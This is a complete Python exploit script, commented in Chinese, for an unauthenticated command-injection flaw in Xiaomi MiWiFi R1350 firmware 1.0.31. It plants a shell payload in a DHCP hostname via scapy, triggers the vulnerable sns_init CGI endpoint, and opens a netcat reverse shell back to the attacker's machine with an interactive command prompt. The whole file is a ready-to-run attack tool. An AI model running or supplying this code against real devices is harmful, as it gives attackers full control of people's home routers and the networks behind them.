#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Xiaomi MiWiFi R1350 (firmware 1.0.31) unauthenticated command injection RCE
=============================================================================
漏洞: /cgi-bin/luci/api/misns/sns_init  (flag 0x01, 无需认证)
污点: DHCP option-12 hostname -> /tmp/dhcp.leases -> misns.lua snsInit()
      -> string.format("matool --method enc --params \"{...\\\"dhcp\\\":\\\"%s\\\"}\"")
      -> luci.util.exec (io.popen -> /bin/sh -c)  [双引号内 $(...) 展开]

依赖: Python3 标准库; --dhcp 模式额外需要 scapy (pip install scapy)
      (Windows + scapy 需要 Npcap 并以管理员运行)

用法:
  # 模式A(推荐,真机): 先以恶意 hostname 取 DHCP 租约,再触发,拿双通道反弹 shell
  python exp_sns_init_rce.py 192.168.31.1 --dhcp --iface "以太网"            # Windows
  python exp_sns_init_rce.py 192.168.31.1 --dhcp --iface eth0               # Linux

  # 模式B: 租约已含 payload(模拟环境手写 leases / 已植入过 hostname),只触发+回连
  python exp_sns_init_rce.py 192.168.1.5 --direct

  # 只打一发验证注入(不进 shell)
  python exp_sns_init_rce.py 192.168.1.5 --direct --no-shell

注意:
  * hostname 不能含空格,命令里用 ${IFS} 代替
  * 本机反弹地址自动取 "到路由器路由的源 IP"; 端口 7411(命令)/7412(回显)
  * 目标可为任何已初始化/未初始化状态的 R1350(0x01 免鉴权不受 init 状态限制)
"""
import argparse
import re
import socket
import subprocess
import sys
import threading
import time

try:
    import urllib.request
except ImportError:
    sys.exit("need python3")

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")

CMD_PORT = 7411   # 攻击机命令下发端口
OUT_PORT = 7412   # 路由器回显端口
TRIGGER_PATH = "/cgi-bin/luci/api/misns/sns_init?callback=poc"


def local_ip_for(router_ip):
    """取本机到 router_ip 路由的源 IP"""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((router_ip, 80))
        return s.getsockname()[0]
    finally:
        s.close()


def http_get(url, timeout=70):
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.read().decode(errors="replace")


def build_payload(lhost, cmd_port, out_port):
    # 双通道: tail -f 顶住 nc1 stdin;nc1 收命令喂 sh;nc2 回显
    # hostname 无空格 -> ${IFS}
    inner = (
        "tail{IFS}-f{IFS}/dev/null|nc{IFS}{LHOST}{IFS}{CPORT}|/bin/sh"
        "|nc{IFS}{LHOST}{IFS}{OPORT}"
        .replace("{IFS}", "${IFS}")
        .replace("{LHOST}", lhost)
        .replace("{CPORT}", str(cmd_port))
        .replace("{OPORT}", str(out_port))
    )
    return "$(%s)" % inner


def dhcp_plant(router_ip, iface, hostname):
    """scapy 发 DHCP DISCOVER+REQUEST, hostname 携带 payload(真机模式)"""
    try:
        from scapy.all import Ether, IP, UDP, BOOTP, DHCP, conf, sendp, srp
    except ImportError:
        sys.exit("[-] --dhcp 需要 scapy: pip install scapy")
    conf.iface = iface
    import uuid
    mac = uuid.uuid4().bytes[:6]
    chaddr = mac + b"\x00" * 10
    xid = int.from_bytes(uuid.uuid4().bytes[:4], "big")

    def pkt(mtype):
        opts = [("message-type", mtype), (12, hostname.encode()),
                ("param_req_list", [1, 3, 6, 15]), "end"]
        return (Ether(src=":".join("%02x" % b for b in mac), dst="ff:ff:ff:ff:ff:ff")
                / IP(src="0.0.0.0", dst="255.255.255.255")
                / UDP(sport=68, dport=67)
                / BOOTP(chaddr=chaddr, xid=xid)
                / DHCP(options=opts))

    print("[*] 发送 DHCP DISCOVER (hostname=%s)" % hostname)
    ans, _ = srp(pkt("discover"), timeout=8, verbose=0)
    if not ans:
        sys.exit("[-] 未收到 DHCP OFFER,检查接口/网段")
    server_id = ans[0][1][DHCP].options
    print("[+] 收到 OFFER, 发送 REQUEST")
    sendp(pkt("request"), verbose=0)
    print("[+] REQUEST 已发, dnsmasq 应已把 hostname 写入 /tmp/dhcp.leases")
    print("[!] 注意: leases 以 mac 为键, 触发请求需从本机(该 mac)发出")


def wait_channel(port, handler, timeout=60):
    srv = socket.socket()
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", port))
    srv.listen(1)
    srv.settimeout(timeout)
    c, a = srv.accept()
    print("[+] channel %d from %s" % (port, a))
    handler(c)
    srv.close()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("router", help="路由器 IP")
    ap.add_argument("--dhcp", action="store_true", help="真机模式: scapy 植入恶意 hostname")
    ap.add_argument("--iface", default=None, help="--dhcp 用的网卡名")
    ap.add_argument("--direct", action="store_true", help="跳过 DHCP 植入(leases 已含 payload)")
    ap.add_argument("--no-shell", action="store_true", help="只触发注入,不进交互 shell")
    args = ap.parse_args()

    if not (args.dhcp or args.direct):
        ap.error("需要 --dhcp 或 --direct 之一")

    lhost = local_ip_for(args.router)
    payload = build_payload(lhost, CMD_PORT, OUT_PORT)
    print("[*] 攻击机 IP: %s" % lhost)
    print("[*] hostname payload: %s" % payload)

    if args.dhcp:
        if not args.iface:
            ap.error("--dhcp 需要 --iface")
        dhcp_plant(args.router, args.iface, payload)
        time.sleep(2)

    cmd_conn = [None]
    out_buf = bytearray()
    lock = threading.Lock()

    def on_cmd(c):
        cmd_conn[0] = c
        def drain():
            try:
                c.recv(4096)
            except Exception:
                pass
        threading.Thread(target=drain, daemon=True).start()

    def on_out(c):
        def pump():
            while True:
                d = c.recv(4096)
                if not d:
                    break
                with lock:
                    out_buf.extend(d)
        threading.Thread(target=pump, daemon=True).start()

    # 监听必须先于触发: leases payload 里的 nc 会立即反连,
    # 若触发时无人监听, busybox nc 退出并使 CGI 挂死占用 fastcgi worker
    threading.Thread(target=wait_channel, args=(CMD_PORT, on_cmd), daemon=True).start()
    threading.Thread(target=wait_channel, args=(OUT_PORT, on_out), daemon=True).start()
    time.sleep(1)

    url = "http://%s%s" % (args.router, TRIGGER_PATH)
    print("[*] 触发: GET %s" % url)
    try:
        resp = http_get(url)
        print("[+] 响应: %s" % resp.strip()[:120])
    except Exception as e:
        print("[-] 触发异常: %s" % e)

    if args.no_shell:
        # 等反弹通道并打印一次命令输出作为证据
        deadline = time.time() + 45
        while time.time() < deadline and cmd_conn[0] is None:
            time.sleep(1)
        if cmd_conn[0] is None:
            print("[-] 反弹通道未建立(检查 leases payload / 防火墙)")
            return
        time.sleep(2)
        cmd_conn[0].sendall(b"exec 2>&1\nid\nuname -a\n")
        time.sleep(3)
        with lock:
            print("=== SHELL EVIDENCE ===")
            print(bytes(out_buf).decode(errors="replace"))
        return

    print("[*] 等待反弹通道...")
    deadline = time.time() + 45
    while time.time() < deadline and cmd_conn[0] is None:
        time.sleep(1)
    if cmd_conn[0] is None:
        sys.exit("[-] 反弹通道未建立(检查 leases payload / 防火墙)")

    time.sleep(2)
    cmd_conn[0].sendall(b"exec 2>&1\nid\nuname -a\n")
    time.sleep(3)
    with lock:
        print("=== SHELL ===")
        print(bytes(out_buf).decode(errors="replace"))

    print("=== 交互模式 (输入命令, exit 退出) ===")
    while True:
        try:
            line = input("rce> ")
        except EOFError:
            break
        if line.strip() in ("exit", "quit"):
            break
        if not line:
            continue
        with lock:
            del out_buf[:]
        cmd_conn[0].sendall((line + "\n").encode())
        time.sleep(2)
        with lock:
            print(bytes(out_buf).decode(errors="replace"))


if __name__ == "__main__":
    main()
